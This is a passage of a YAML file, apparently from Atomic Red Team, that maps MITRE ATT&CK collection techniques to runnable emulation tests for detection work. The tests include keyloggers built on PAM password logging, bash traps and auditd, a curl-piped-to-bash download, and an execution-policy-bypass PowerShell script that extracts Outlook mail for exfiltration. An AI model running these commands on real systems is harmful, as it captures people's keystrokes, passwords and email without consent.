        prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''

          '
        get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so
          and recompile, for this test to work"

          '
      supported_platforms:
      - linux
      executor:
        command: |
          if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;
          if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;
          sudo touch /tmp/password-auth.bk
          sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so
          enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so
          enable=* log_password" >> /etc/pam.d/system-auth
        cleanup_command: |
          sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth
          sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
        name: sh
        elevation_required: true
    - name: Logging bash history to syslog
      auto_generated_guid: 0e59d59d-3265-4d35-bebd-bf5c1ec40db5
      description: "There are several variables that can be set to control the appearance
        of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents
        of these variables are executed as if they had been typed on the command line.
        The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable
        and can be configured to write the latest \"bash history\" entries to the
        syslog.\n\nTo gain persistence the command could be added to the users .bashrc
        or .bash_aliases or the systems default .bashrc in /etc/skel/ \n"
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'This test requires to be run in a bash shell and that logger
          and tee are installed.

          '
        prereq_command: |
          if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
          if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed *****\n"; exit 1; fi
          if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n"; exit 1; fi
        get_prereq_command: 'echo ""

          '
      executor:
        name: sh
        elevation_required: true
        command: |
          PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
          echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
          tail /var/log/syslog
        cleanup_command: 'unset PROMPT_COMMAND

          '
    - name: Bash session based keylogger
      auto_generated_guid: 7f85a946-a0ea-48aa-b6ac-8ff539278258
      description: "When a command is executed in bash, the BASH_COMMAND variable
        contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\".
        The trap command is not a external command, but a built-in function of bash
        and can be used in a script to run a bash function when some event occurs.
        trap will detect when the BASH_COMMAND variable value changes and then pipe
        that value into a file, creating a bash session based keylogger. \n\nTo gain
        persistence the command could be added to the users .bashrc or .bash_aliases
        or the systems default .bashrc in /etc/skel/ \n"
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'This test requires to be run in a bash shell

          '
        prereq_command: 'if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n*****
          Bash not running! *****\n"; exit 1; fi

          '
        get_prereq_command: 'echo ""

          '
      input_arguments:
        output_file:
          name: output_file
          description: File to store captured commands
          type: string
          default: "/tmp/.keyboard.log"
      executor:
        name: sh
        elevation_required: false
        command: |
          trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
          echo "Hello World!"
          cat #{output_file}
        cleanup_command: 'rm #{output_file}

          '
    - name: SSHD PAM keylogger
      auto_generated_guid: 81d7d2ad-d644-4b6a-bea7-28ffe43becca
      description: 'Linux PAM (Pluggable Authentication Modules) is used in sshd authentication.
        The Linux audit tool auditd can use the pam_tty_audit module to enable auditing
        of TTY input and capture all keystrokes in a ssh session and place them in
        the /var/log/audit/audit.log file after the session closes.

        '
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'This test requires sshd and auditd

          '
        prereq_command: |
          if [ ! -x "$(command -v sshd)" ]; then echo -e "\n***** sshd NOT installed *****\n"; exit 1; fi
          if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
        get_prereq_command: 'echo ""

          '
      input_arguments:
        user_account:
          description: Basic ssh user account for testing.
          type: string
          default: ubuntu
      executor:
        name: sh
        elevation_required: true
        command: "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so
          disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl
          restart sshd\nsystemctl restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo
          su\nwhoami\nexit\nexit\n"
        cleanup_command: 'cp -fv /tmp/sshd /etc/pam.d/

          '
    - name: Auditd keylogger
      auto_generated_guid: a668edb9-334e-48eb-8c2e-5413a40867af
      description: "The linux audit tool auditd can be used to capture 32 and 64 bit
        command execution and place the command in the /var/log/audit/audit.log audit
        log. \n"
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'This test requires sshd and auditd

          '
        prereq_command: 'if [ ! -x "$(command -v auditd)" ]; then echo -e "\n*****
          auditd NOT installed *****\n"; exit 1; fi

          '
        get_prereq_command: 'echo ""

          '
      executor:
        name: sh
        elevation_required: true
        command: "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl
          -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start
          $(date +\"%d/%m/%y %H:%M:%S\") \n"
        cleanup_command: 'systemctl restart auditd

          '
    - name: MacOS Swift Keylogger
      auto_generated_guid: aee3a097-4c5c-4fff-bbd3-0a705867ae29
      description: |
        Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.
        Input Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.
        Referece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74
      supported_platforms:
      - macos
      input_arguments:
        swift_src:
          description: Location of swift script
          type: path
          default: PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift
      dependency_executor_name: bash
      dependencies:
      - description: 'swift script must exist at #{swift_src}, and the terminal must
          have input monitoring permissions.

          '
        prereq_command: 'if [ -f #{swift_src} ]; then chmod +x #{swift_src}; else
          exit 1; fi

          '
        get_prereq_command: 'echo ""

          '
      executor:
        command: 'swift #{swift_src} -keylog

          '
        cleanup_command: 'kill `pgrep swift-frontend`

          '
        name: bash
        elevation_required: false
  T1602:
    technique:
      x_mitre_platforms:
      - Network
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74
      created: '2020-10-19T23:46:13.931Z'
      x_mitre_version: '1.0'
      external_references:
      - source_name: mitre-attack
        external_id: T1602
        url: https://attack.mitre.org/techniques/T1602
      - source_name: Cisco Advisory SNMP v3 Authentication Vulnerabilities
        url: https://tools.cisco.com/security/center/content/CiscoAppliedMitigationBulletin/cisco-amb-20080610-SNMPv3
        description: Cisco. (2008, June 10). Identifying and Mitigating Exploitation
          of the SNMP Version 3 Authentication Vulnerabilities. Retrieved October
          19, 2020.
      - source_name: US-CERT TA17-156A SNMP Abuse 2017
        url: https://us-cert.cisa.gov/ncas/alerts/TA17-156A
        description: US-CERT. (2017, June 5). Reducing the Risk of SNMP Abuse. Retrieved
          October 19, 2020.
      - source_name: US-CERT-TA18-106A
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.

        Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)
      modified: '2022-04-19T21:32:58.274Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Data from Configuration Repository
      x_mitre_detection: 'Identify network traffic sent or received by untrusted hosts
        or networks that solicits and obtains the configuration information of the
        queried device.(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities)'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Content'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1213.002:
    technique:
      x_mitre_platforms:
      - Windows
      - Office 365
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a
      type: attack-pattern
      created: '2020-02-14T13:35:32.938Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1213.002
        url: https://attack.mitre.org/techniques/T1213/002
      - url: https://support.office.com/en-us/article/configure-audit-settings-for-a-site-collection-a9920c97-38c0-44f2-8bcb-4cf1e2ae22d2
        description: Microsoft. (2017, July 19). Configure audit settings for a site
          collection. Retrieved April 4, 2018.
        source_name: Microsoft SharePoint Logging
      modified: '2021-06-08T17:10:31.187Z'
      name: Sharepoint
      description: |
        Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:

        * Policies, procedures, and standards
        * Physical / logical network diagrams
        * System architecture diagrams
        * Technical system documentation
        * Testing / development credentials
        * Work / project schedules
        * Source code snippets
        * Links to network shares and other internal resources
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: "The user access logging within Microsoft's SharePoint can
        be configured to report access to certain pages and documents. (Citation:
        Microsoft SharePoint Logging). As information repositories generally have
        a considerably large user base, detection of malicious use can be non-trivial.
        At minimum, access to information repositories performed by privileged users
        (for example, Active Directory Domain, Enterprise, or Schema Administrators)
        should be closely monitored and alerted upon, as these types of accounts should
        generally not be used to access information repositories. If the capability
        exists, it may be of value to monitor and alert on users that are retrieving
        and viewing a large number of documents and pages; this behavior may be indicative
        of programmatic means being used to retrieve all data within the repository.
        In environments with high-maturity, it may be possible to leverage User-Behavioral
        Analytics (UBA) platforms to detect and alert on user based anomalies. \n\n"
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Creation'
      - 'Application Log: Application Log Content'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1123:
    technique:
      modified: '2023-03-30T21:01:36.503Z'
      name: Audio Capture
      description: |-
        An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.

        Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: |-
        Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.

        Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.0'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: OS API Execution'
      x_mitre_permissions_required:
      - User
      type: attack-pattern
      id: attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967
      created: '2017-05-31T21:31:34.528Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1123
        external_id: T1123
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_is_subtechnique: false
      identifier: T1123
    atomic_tests:
    - name: using device audio capture commandlet
      auto_generated_guid: 9c3ad250-b185-4444-b5a9-d69218a10c95
      description: "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n"
      supported_platforms:
      - windows
      executor:
        command: 'powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet

          '
        name: powershell
    - name: Registry artefact when application use microphone
      auto_generated_guid: 7a21cce2-6ada-4f7c-afd9-e1e9c481e44a
      description: "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n"
      supported_platforms:
      - windows
      executor:
        command: |
          reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
          reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
        cleanup_command: 'reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe
          /f

          '
        name: command_prompt
    - name: using Quicktime Player
      auto_generated_guid: c7a0bb71-70ce-4a53-b115-881f241b795b
      description: |
        Use AppleScript to get Quicktime Player to record an audio file from the default microphone.

        Should create a non-empty m4a file with sound from the microphone.

        - requires Automation permissions but no additional microphone permissions
        - saves file in /tmp by default. Other locations likely to require more permissions.
      supported_platforms:
      - macos
      input_arguments:
        filename:
          description: Location of the script
          type: path
          default: PathToAtomicsFolder/T1123/src/T1123.sh
        audiofile:
          description: Location of the recorded audio file
          type: path
          default: "/tmp/T1123.m4a"
        duration:
          description: Length of recording to make in seconds
          type: integer
          default: 5
      executor:
        command: 'sh #{filename} #{audiofile} #{duration}

          '
        cleanup_command: |
          if test -w #{audiofile}; then
            rm #{audiofile}
          fi
        name: sh
  T1560.003:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--143c0cbb-a297-4142-9624-87ffc778980b
      type: attack-pattern
      created: '2020-02-20T21:09:55.995Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1560.003
        url: https://attack.mitre.org/techniques/T1560/003
      - url: http://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part-2.pdf
        description: 'ESET. (2016, October). En Route with Sednit - Part 2: Observing
          the Comings and Goings. Retrieved November 21, 2016.'
        source_name: ESET Sednit Part 2
      modified: '2020-03-25T22:48:14.605Z'
      name: Archive via Custom Method
      description: 'An adversary may compress or encrypt data that is collected prior
        to exfiltration using a custom method. Adversaries may choose to use custom
        archival methods, such as encryption with XOR or stream ciphers implemented
        with no external library or utility references. Custom implementations of
        well-known compression algorithms have also been used.(Citation: ESET Sednit
        Part 2)'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: Custom archival methods can be very difficult to detect,
        since many of them use standard programming language concepts, such as bitwise
        operations.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'File: File Creation'
      - 'Script: Script Execution'
    atomic_tests: []
  T1114:
    technique:
      modified: '2023-04-12T20:46:04.871Z'
      name: Email Collection
      description: 'Adversaries may target user email to collect sensitive information.
        Emails may contain sensitive data, including trade secrets or personal information,
        that can prove valuable to adversaries. Adversaries can collect or forward
        email from mail servers or clients. '
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_contributors:
      - Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC)
      x_mitre_deprecated: false
      x_mitre_detection: |-
        There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.

        File access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.

        Monitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.

        Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include <code>X-MS-Exchange-Organization-AutoForwarded</code> set to true, <code>X-MailFwdBy</code> and <code>X-Forwarded-To</code>. The <code>forwardingSMTPAddress</code> parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the <code>X-MS-Exchange-Organization-AutoForwarded</code> header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - Office 365
      - Google Workspace
      - macOS
      - Linux
      x_mitre_version: '2.4'
      x_mitre_data_sources:
      - 'File: File Access'
      - 'Logon Session: Logon Session Creation'
      - 'Application Log: Application Log Content'
      - 'Command: Command Execution'
      - 'Network Traffic: Network Connection Creation'
      type: attack-pattern
      id: attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f
      created: '2017-05-31T21:31:25.454Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1114
        external_id: T1114
      - source_name: Microsoft Tim McMichael Exchange Mail Forwarding 2
        description: McMichael, T.. (2015, June 8). Exchange and Office 365 Mail Forwarding.
          Retrieved October 8, 2019.
        url: https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1025:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - William Cain
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--1b7ba276-eedc-4951-a762-0ceea2c030ec
      type: attack-pattern
      created: '2017-05-31T21:30:31.584Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1025
        external_id: T1025
      modified: '2021-10-15T22:17:35.218Z'
      name: Data from Removable Media
      description: "Adversaries may search connected removable media on computers
        they have compromised to find files of interest. Sensitive data can be collected
        from any removable media (optical disk drive, USB memory, etc.) connected
        to the compromised system prior to Exfiltration. Interactive command shells
        may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106)
        may be used to gather information. \n\nSome adversaries may also use [Automated
        Collection](https://attack.mitre.org/techniques/T1119) on removable media."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: Monitor processes and command-line arguments for actions
        that could be taken to collect files from a system's connected removable media.
        Remote access tools with built-in features may interact directly with the
        Windows API to gather data. Data may also be acquired through Windows system
        management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
        and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'File: File Access'
      x_mitre_system_requirements:
      - Privileges to access removable media drive and files
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1074.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Massimiliano Romano, BT Security
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c
      created: '2020-03-13T21:13:10.467Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1074.001
        url: https://attack.mitre.org/techniques/T1074/001
      - source_name: Prevailion DarkWatchman 2021
        url: https://www.prevailion.com/darkwatchman-new-fileless-techniques/
        description: 'Smith, S., Stafford, M. (2021, December 14). DarkWatchman: A
          new evolution in fileless techniques. Retrieved January 10, 2022.'
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

        Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)
      modified: '2022-04-21T16:07:10.829Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: 'Data Staged: Local Data Staging'
      x_mitre_detection: |-
        Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.

        Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        Consider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'File: File Access'
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Command: Command Execution'
      - 'File: File Creation'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1074.001
    atomic_tests:
    - name: Stage data from Discovery.bat
      auto_generated_guid: 107706a5-6f9f-451a-adae-bab8c667829f
      description: |
        Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,
        verify that the file is saved in the temp directory.
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: Location to save downloaded discovery.bat file
          type: path
          default: "$env:TEMP\\discovery.bat"
      executor:
        command: 'Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat"
          -OutFile #{output_file}

          '
        cleanup_command: 'Remove-Item -Force #{output_file} -ErrorAction Ignore

          '
        name: powershell
    - name: Stage data from Discovery.sh
      auto_generated_guid: 39ce0303-ae16-4b9e-bb5b-4f53e8262066
      description: 'Utilize curl to download discovery.sh and execute a basic information
        gathering shell script

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        output_file:
          description: Location to save downloaded discovery.bat file
          type: path
          default: "/tmp/T1074.001_discovery.log"
      executor:
        command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh
          | bash -s > #{output_file}

          '
        name: bash
    - name: Zip a Folder with PowerShell for Staging in Temp
      auto_generated_guid: a57fbe4b-3440-452a-88a7-943531ac872a
      description: |
        Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
        was placed in the temp directory.
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: Location to save zipped file or folder
          type: path
          default: "$env:TEMP\\Folder_to_zip.zip"
        input_file:
          description: Location of file or folder to zip
          type: path
          default: PathToAtomicsFolder\T1074.001\bin\Folder_to_zip
      executor:
        command: 'Compress-Archive -Path #{input_file} -DestinationPath #{output_file}
          -Force

          '
        cleanup_command: 'Remove-Item -Path #{output_file} -ErrorAction Ignore

          '
        name: powershell
  T1114.001:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004
      type: attack-pattern
      created: '2020-02-19T18:46:06.098Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1114.001
        url: https://attack.mitre.org/techniques/T1114/001
      - source_name: Outlook File Sizes
        url: https://practical365.com/clients/office-365-proplus/outlook-cached-mode-ost-file-sizes/
        description: N. O'Bryan. (2018, May 30). Managing Outlook Cached Mode and
          OST File Sizes. Retrieved February 19, 2020.
      - source_name: Microsoft Outlook Files
        url: https://support.office.com/en-us/article/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790
        description: Microsoft. (n.d.). Introduction to Outlook Data Files (.pst and
          .ost). Retrieved February 19, 2020.
      modified: '2020-03-24T17:59:20.983Z'
      name: 'Email Collection: Local Email Collection'
      description: |-
        Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a users local system, such as Outlook storage or cache files.

        Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\Users\<username>\Documents\Outlook Files` or `C:\Users\<username>\AppData\Local\Microsoft\Outlook`.(Citation: Microsoft Outlook Files)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: Monitor processes and command-line arguments for actions
        that could be taken to gather local email files. Monitor for unusual processes
        accessing local email files. Remote access tools with built-in features may
        interact directly with the Windows API to gather information. Information
        may also be acquired through Windows system management tools such as [Windows
        Management Instrumentation](https://attack.mitre.org/techniques/T1047) and
        [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'File: File Access'
      x_mitre_permissions_required:
      - User
      identifier: T1114.001
    atomic_tests:
    - name: Email Collection with PowerShell Get-Inbox
      auto_generated_guid: 3f1b5096-0139-4736-9b78-19bcb02bb1cb
      description: |
        Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.
        Successful execution will produce stdout message stating "Please be patient, this may take some time...". Upon completion, final output will be a mail.csv file.

        Note: Outlook is required, but no email account necessary to produce artifacts.
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: Output file path
          type: string
          default: "$env:TEMP\\mail.csv"
        file_path:
          description: File path for Get-Inbox.ps1
          type: string
          default: PathToAtomicsFolder\T1114.001\src
      dependency_executor_name: powershell
      dependencies:
      - description: 'Get-Inbox.ps1 must be located at #{file_path}

          '
        prereq_command: 'if (Test-Path #{file_path}\Get-Inbox.ps1) {exit 0} else {exit
          1}

          '
        get_prereq_command: 'Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114.001/src/Get-Inbox.ps1"
          -OutFile "#{file_path}\Get-Inbox.ps1"

          '
      executor:
        command: 'powershell -executionpolicy bypass -command #{file_path}\Get-Inbox.ps1
          -file #{output_file}

          '
        cleanup_command: 'Remove-Item #{output_file} -Force -ErrorAction Ignore

          '
        name: powershell
  T1119:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - IaaS
      - SaaS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Praetorian
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
